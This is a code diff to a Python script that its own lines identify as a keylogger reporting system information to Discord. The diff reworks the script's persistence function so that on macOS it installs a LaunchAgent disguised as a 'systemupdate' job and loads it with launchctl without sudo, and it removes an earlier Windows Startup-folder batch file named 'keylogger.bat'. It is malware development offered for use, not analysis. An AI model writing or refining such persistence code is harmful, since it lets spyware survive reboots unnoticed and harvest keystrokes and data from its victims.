@@ -104,27 +104,19 @@ def get_system_info():
 
 # Function to make the script persistent
 def make_persistent():
+    # Define the path for LaunchAgents (user-level, no sudo required)
     if platform.system() == "Darwin":  # macOS
-        startup_dir = os.path.expanduser("~/Library/LaunchAgents/")
-    elif platform.system() == "Windows":
-        startup_dir = os.path.expanduser("~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
-    else:
-        startup_dir = "/etc/init.d/"
-
-    if not os.path.exists(startup_dir):
-        os.makedirs(startup_dir)
-
-    if platform.system() == "Darwin":
+        agent_dir = os.path.expanduser("~/Library/LaunchAgents/")
         plist_content = f'''
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
         <plist version="1.0">
             <dict>
                 <key>Label</key>
-                <string>com.apple.systemupdate</string>
+                <string>com.user.systemupdate</string>
                 <key>ProgramArguments</key>
                 <array>
-                    <string>/usr/bin/python3</string>
+                    <string>/usr/local/bin/python3</string>
                     <string>{os.path.realpath(__file__)}</string>
                 </array>
                 <key>RunAtLoad</key>
@@ -134,18 +126,18 @@ def make_persistent():
             </dict>
         </plist>
         '''
-        plist_path = os.path.join(startup_dir, "com.apple.systemupdate.plist")
+        # Ensure the LaunchAgents directory exists
+        if not os.path.exists(agent_dir):
+            os.makedirs(agent_dir)
+        
+        plist_path = os.path.join(agent_dir, "com.user.systemupdate.plist")
+        
+        # Write the plist file
         with open(plist_path, "w") as plist_file:
             plist_file.write(plist_content)
-    elif platform.system() == "Windows":
-        bat_content = f'''
-        @echo off
-        python {os.path.realpath(__file__)}
-        '''
-        bat_path = os.path.join(startup_dir, "keylogger.bat")
-        with open(bat_path, "w") as bat_file:
-            bat_file.write(bat_content)
-
+        
+        # Load the plist using launchctl (no sudo required)
+        os.system(f"launchctl load {plist_path}")
 
 if __name__ == "__main__":
     get_system_info()  # Send system info to Discord
